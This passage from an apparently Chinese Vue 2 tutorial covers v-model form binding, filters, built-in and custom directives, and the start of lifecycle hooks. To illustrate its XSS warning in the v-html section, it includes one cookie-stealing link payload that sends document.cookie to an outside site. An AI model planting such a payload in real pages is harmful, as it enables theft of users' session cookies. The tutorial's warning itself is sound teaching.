punctuation">.</span>friends<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'张三'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function">addHobby</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>hobby<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'学习'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function">updateHobby</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// this.student.hobby.splice(0,1,'开车')</span>        <span class="token comment">// Vue.set(this.student.hobby,0,'开车')</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>hobby<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'开车'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function">removeSmoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>hobby <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>hobby<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">h</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> h <span class="token operator">!==</span> <span class="token string">'抽烟'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="十四、收集表单数据"><a href="#十四、收集表单数据" class="headerlink" title="十四、收集表单数据"></a>十四、收集表单数据</h2><h3 id="1-input为输入框"><a href="#1-input为输入框" class="headerlink" title="1. input为输入框"></a>1. input为输入框</h3><p> input的type属性值为text时,则v-model收集的是value值，用户输入的就是value值</p><h3 id="2-input为单选框"><a href="#2-input为单选框" class="headerlink" title="2. input为单选框"></a>2. input为单选框</h3><p> input的type属性值为radio时,则v-model收集的是value值，且要给标签配置value值</p><h3 id="3-input为多选框"><a href="#3-input为多选框" class="headerlink" title="3. input为多选框"></a>3. input为多选框</h3><p> input的type属性值为checkbox时:<br>  ①没有配置input的value属性，那么收集的就是checked(勾选 or 未勾选，是布尔值)</p><p>  ②配置input的value值<br>   (1)v-model的初始值是非数组，那么收集的就是checked(勾选 or 未勾选，是布尔值)</p><p>   (2)v-model的初始值是数组，那么收集的的就是value组成的数组</p><h3 id="4-备注"><a href="#4-备注" class="headerlink" title="4. 备注"></a>4. 备注</h3><p> v-model的三个修饰符<br>  Ⅰ.lazy: 失去焦点再收集数据<br>  Ⅱ.number: 输入字符串转为有效的数字<br>  Ⅲ.trim: 输入首尾空格过滤</p> <pre class="language-js" data-language="js"><code class="language-js">  <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span>      账号：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> v<span class="token operator">-</span>model<span class="token punctuation">.</span>trim<span class="token operator">=</span><span class="token string">"userInfo.account"</span><span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>      密码：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"password"</span> v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"userInfo.password"</span><span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>      年龄：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"number"</span> v<span class="token operator">-</span>model<span class="token punctuation">.</span>number<span class="token operator">=</span><span class="token string">"userInfo.age"</span><span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>      性别：      男<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"radio"</span> name<span class="token operator">=</span><span class="token string">"sex"</span> v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"userInfo.sex"</span> value<span class="token operator">=</span><span class="token string">"male"</span><span class="token operator">></span>      女<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"radio"</span> name<span class="token operator">=</span><span class="token string">"sex"</span> v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"userInfo.sex"</span> value<span class="token operator">=</span><span class="token string">"female"</span><span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>      爱好：      学习<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"checkbox"</span> v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"userInfo.hobby"</span> value<span class="token operator">=</span><span class="token string">"study"</span><span class="token operator">></span>      打游戏<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"checkbox"</span> v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"userInfo.hobby"</span> value<span class="token operator">=</span><span class="token string">"game"</span><span class="token operator">></span>      吃饭<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"checkbox"</span> v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"userInfo.hobby"</span> value<span class="token operator">=</span><span class="token string">"eat"</span><span class="token operator">></span>      <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>      所属校区      <span class="token operator">&lt;</span>select v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"userInfo.city"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span>请选择校区<span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token string">"beijing"</span><span class="token operator">></span>北京<span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token string">"shanghai"</span><span class="token operator">></span>上海<span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token string">"shenzhen"</span><span class="token operator">></span>深圳<span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>        <span class="token operator">&lt;</span>option value<span class="token operator">=</span><span class="token string">"wuhan"</span><span class="token operator">></span>武汉<span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span>      <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>      其他信息：      <span class="token operator">&lt;</span>textarea v<span class="token operator">-</span>model<span class="token punctuation">.</span>lazy<span class="token operator">=</span><span class="token string">"userInfo.other"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>textarea<span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>      <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"checkbox"</span> v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"userInfo.agree"</span><span class="token operator">></span>阅读并接受<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.atguigu.com"</span><span class="token operator">></span>《用户协议》<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>      <span class="token operator">&lt;</span>button<span class="token operator">></span>提交<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>  Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span>  <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    el<span class="token operator">:</span> <span class="token string">'#root'</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      userInfo<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        account<span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        password<span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        age<span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>        sex<span class="token operator">:</span> <span class="token string">'female'</span><span class="token punctuation">,</span>        hobby<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        city<span class="token operator">:</span> <span class="token string">'beijing'</span><span class="token punctuation">,</span>        other<span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        agree<span class="token operator">:</span> <span class="token string">''</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="十五、过滤器"><a href="#十五、过滤器" class="headerlink" title="十五、过滤器"></a>十五、过滤器</h2><h3 id="1-定义-1"><a href="#1-定义-1" class="headerlink" title="1. 定义"></a>1. 定义</h3><p> 过滤器,对要显示的数据进行特定格式化后再显示(适用于一些简单逻辑的处理)</p><h3 id="2-语法"><a href="#2-语法" class="headerlink" title="2. 语法"></a>2. 语法</h3><h4 id="2-1-注册过滤器"><a href="#2-1-注册过滤器" class="headerlink" title="2.1 注册过滤器"></a>2.1 注册过滤器</h4><p> ①全局注册 <code>Vue.filter(name,callback)</code><br> ②局部注册 <code>new Vue&#123;filters:&#123;&#125;&#125;</code></p><h4 id="2-2-使用过滤器"><a href="#2-2-使用过滤器" class="headerlink" title="2.2 使用过滤器"></a>2.2 使用过滤器</h4><p> ①插值使用 <code>&#123;&#123; xxx | 过滤器名&#125;&#125;</code><br> ②绑定使用 v-bind:属性 = “xxx | 过滤器名”</p><h4 id="2-3-备注"><a href="#2-3-备注" class="headerlink" title="2.3 备注"></a>2.3 备注</h4><p> 1.过滤器也可以接收额外参数,多个过滤器也可以串联<br> 2.并没有改变原本的数据,是产生新的对应的数据</p> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>显示格式化后的时间<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 过滤器实现 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>h3<span class="token operator">></span>现在是：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>time <span class="token operator">|</span> timeFormater<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 过滤器实现（传参） <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>h3<span class="token operator">></span>现在是：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>time <span class="token operator">|</span> <span class="token function">timeFormater</span><span class="token punctuation">(</span><span class="token string">'YYYY_MM_DD'</span><span class="token punctuation">)</span> <span class="token operator">|</span> mySlice<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span>h3 <span class="token operator">:</span>x<span class="token operator">=</span><span class="token string">"msg | mySlice"</span><span class="token operator">></span>尚硅谷<span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token comment">//全局过滤器</span>Vue<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token string">'mySlice'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> value<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>time<span class="token operator">:</span><span class="token number">1621561377603</span><span class="token punctuation">,</span> <span class="token comment">//时间戳</span>msg<span class="token operator">:</span><span class="token string">'你好,辉煌集团'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token comment">//局部过滤器</span>filters<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token function">timeFormater</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>str<span class="token operator">=</span><span class="token string">'YYYY年MM月DD日 HH:mm:ss'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">dayjs</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h2 id="十六、指令"><a href="#十六、指令" class="headerlink" title="十六、指令"></a>十六、指令</h2><h3 id="1-指令"><a href="#1-指令" class="headerlink" title="1. 指令"></a>1. 指令</h3><p> ① v-bind    : 单向绑定解析表达式, 可简写为 :xxx</p><p> ② v-model    : 双向数据绑定</p><p> ③ v-for      : 遍历数组/对象/字符串</p><p> ④ v-on       : 绑定事件监听, 可简写为@</p><p> ⑤ v-if          : 条件渲染（动态控制节点是否存存在）<br>    v-else     : 条件渲染（动态控制节点是否存存在）</p><p> ⑥ v-show     : 条件渲染 (动态控制节点是否展示)</p><p> ⑦ v-text<br>  Ⅰ.作用<br>   向其所在的节点中渲染文本内容</p><p>  Ⅱ.与插值的区别<br>   v-text会替换掉节点中的内容,插值不会</p>  <pre class="language-js" data-language="js"><code class="language-js">  <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>div<span class="token operator">></span>你好，<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>div v<span class="token operator">-</span>text<span class="token operator">=</span><span class="token string">"name"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>div v<span class="token operator">-</span>text<span class="token operator">=</span><span class="token string">"str"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'张小6'</span><span class="token punctuation">,</span>str<span class="token operator">:</span><span class="token string">'&lt;h3>你好啊！&lt;/h3>'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p> ⑧ v-html<br>  Ⅰ.作用<br>   向指定节点中渲染包含html结构的内容</p><p>  Ⅱ.与插值的区别<br>   (1) v-html会替换掉节点中所有的内容,插值不会</p><p>   (2) v-html可以识别html结构</p><p>  Ⅲ.严重注意<br>   (1) 在网站上动态渲染任意HTML是非常危险的,容易导致XSS攻击</p><p>   (2) 一定要在可信的内容上使用v-html,永不用在用户提交的内容上</p>   <pre class="language-js" data-language="js"><code class="language-js">   <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>div<span class="token operator">></span>你好，<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>div v<span class="token operator">-</span>html<span class="token operator">=</span><span class="token string">"str"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>div v<span class="token operator">-</span>html<span class="token operator">=</span><span class="token string">"str2"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>   <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'张小6'</span><span class="token punctuation">,</span>str<span class="token operator">:</span><span class="token string">'&lt;h3>你好啊！&lt;/h3>'</span><span class="token punctuation">,</span>str2<span class="token operator">:</span><span class="token string">'&lt;a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！&lt;/a>'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>  ⑨ v-cloak<br>   Ⅰ.本质是一个特殊属性,Vue实例创建完毕并接管容器后,会删掉v-cloak属性</p><p>   Ⅱ.使用css配合v-cloak,可以解决网速慢时,页面展示出的问题(网慢,未编译成功)</p>   <pre class="language-js" data-language="js"><code class="language-js">   <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>h2 v<span class="token operator">-</span>cloak<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>   <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'辉煌集团'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>  ⑩ v-once<br>   Ⅰ. v-once所在节点在初次动态渲染后,就视为静态内容了</p><p>   Ⅱ.以后数据的改变不会引起v-once所在结构的更新,可以用于性能优化</p>   <pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span> <span class="token operator">&lt;</span>h2 v<span class="token operator">-</span>once<span class="token operator">></span>初始化的n值是<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span> <span class="token operator">&lt;</span>h2<span class="token operator">></span>当前的n值是<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span> <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"n++"</span><span class="token operator">></span>点我n<span class="token operator">+</span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>  <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    el<span class="token operator">:</span> <span class="token string">'#root'</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      n<span class="token operator">:</span> <span class="token number">1</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>  ⑩① v-pre<br>   Ⅰ.跳过其所在节点的编译过程</p><p>   Ⅱ.可以利用它跳过,没有使用指令语法、没有使用插值语法的节点,会加快编译</p>   <pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>h2 v<span class="token operator">-</span>pre<span class="token operator">></span>Vue其实很简单<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span>  <span class="token operator">&lt;</span>h2<span class="token operator">></span>当前的n值是<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span>  <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"n++"</span><span class="token operator">></span>点我n<span class="token operator">+</span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>  <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    el<span class="token operator">:</span> <span class="token string">'#root'</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      n<span class="token operator">:</span> <span class="token number">1</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h3 id="2-自定义指令"><a href="#2-自定义指令" class="headerlink" title="2. 自定义指令"></a>2. 自定义指令</h3><h4 id="2-1-定义"><a href="#2-1-定义" class="headerlink" title="2.1 定义"></a>2.1 定义</h4><p> (1) 局部指令<br>   <pre class="language-new" data-language="new"><div class="caption"><span>Vue(&#123; directives:&#123; 指令名:配置对象 &#125; &#125;)``` 或</span></div><code class="language-new">   &#96;&#96;&#96; new Vue(&#123; directives:&#123; 指令名:回调函数 &#125; &#125;)&#96;&#96;&#96; (2) 全局指令  &#96;&#96;&#96; Vue.directive(指令名,配置对象)&#96;&#96;&#96; 或  &#96;&#96;&#96; Vue.directive(指令名,回调函数)&#96;&#96;&#96;#### 2.2 配置对象中常用的3个回调 1. bind: 指令与元素成功绑定时调用 2. inserted: 指令所在元素被插入页面时调用 3. update: 指令所在模板结构被重新解析时调用#### 2.3 备注 1. 指令定义时不加v-,但使用时要加v- 2.指令名如果是多个,要使用kebab-case命名方式,不要使用camelCase命名 &#96;&#96;&#96; js  &lt;div id&#x3D;&quot;root&quot;&gt;    &lt;h2&gt;&#123;&#123;name&#125;&#125;&lt;&#x2F;h2&gt;    &lt;h2&gt;当前的n值是：&lt;span v-text&#x3D;&quot;n&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;h2&gt;    &lt;!-- &lt;h2&gt;放大10倍后的n值是：&lt;span v-big-number&#x3D;&quot;n&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;h2&gt; --&gt;    &lt;h2&gt;放大10倍后的n值是：&lt;span v-big&#x3D;&quot;n&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;h2&gt;    &lt;button @click&#x3D;&quot;n++&quot;&gt;点我n+1&lt;&#x2F;button&gt;    &lt;hr &#x2F;&gt;    &lt;input type&#x3D;&quot;text&quot; v-fbind:value&#x3D;&quot;n&quot;&gt;  &lt;&#x2F;div&gt;  &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;    &#x2F;&#x2F;定义全局指令    &#x2F;* Vue.directive(&#39;fbind&#39;,&#123;      &#x2F;&#x2F;指令与元素成功绑定时（一上来）      bind(element,binding)&#123;        element.value &#x3D; binding.value      &#125;,      &#x2F;&#x2F;指令所在元素被插入页面时      inserted(element,binding)&#123;        element.focus()      &#125;,      &#x2F;&#x2F;指令所在的模板被重新解析时      update(element,binding)&#123;        element.value &#x3D; binding.value      &#125;    &#125;) *&#x2F;      new Vue(&#123;        el: &#39;#root&#39;,        data: &#123;          name: &#39;尚硅谷&#39;,          n: 1        &#125;,        directives: &#123;          &#x2F;&#x2F;big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。          &#x2F;* &#39;big-number&#39;(element,binding)&#123;            &#x2F;&#x2F; console.log(&#39;big&#39;)            element.innerText &#x3D; binding.value * 10          &#125;, *&#x2F;          big(element, binding) &#123;            console.log(&#39;big&#39;, this) &#x2F;&#x2F;注意此处的this是window            &#x2F;&#x2F; console.log(&#39;big&#39;)            element.innerText &#x3D; binding.value * 10          &#125;,          fbind: &#123;            &#x2F;&#x2F;指令与元素成功绑定时（一上来）            bind(element, binding) &#123;              element.value &#x3D; binding.value            &#125;,            &#x2F;&#x2F;指令所在元素被插入页面时            inserted(element, binding) &#123;              element.focus()            &#125;,            &#x2F;&#x2F;指令所在的模板被重新解析时            update(element, binding) &#123;              element.value &#x3D; binding.value            &#125;          &#125;        &#125;      &#125;)  &lt;&#x2F;script&gt;</code></pre></p><h2 id="十七、Vue生命周期"><a href="#十七、Vue生命周期" class="headerlink" title="十七、Vue生命周期"></a>十七、Vue生命周期</h2><h3 id="1-什么是生命周期"><a href="#1-什么是生命周期" class="headerlink" title="1. 什么是生命周期"></a>1. 什么是生命周期</h3><p> ①又名: 生命周期回调函数、生命周期函数、生命周期钩子</p><p> ②是什么: Vue在关键时刻帮我们调用的一些特殊名称的函数</p><p> ③生命周期函数的名字不可更改,但函数的具体内容是根据程序员根据需求编写的</p><p> ④生命周期函数中的this指向是vm 或 组件实例对象</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>h2 v<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">></span>你好啊<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span>  <span class="token operator">&lt;</span>h2 <span class="token operator">:</span>style<span class="token operator">=</span><span class="token string">"&#123;opacity&#125;"</span><span class="token operator">></span>欢迎学习Vue<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>  <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    el<span class="token operator">:</span> <span class="token string">'#root'</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      a<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      opacity<span class="token operator">:</span> <span class="token number">1</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted</span>    <span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token 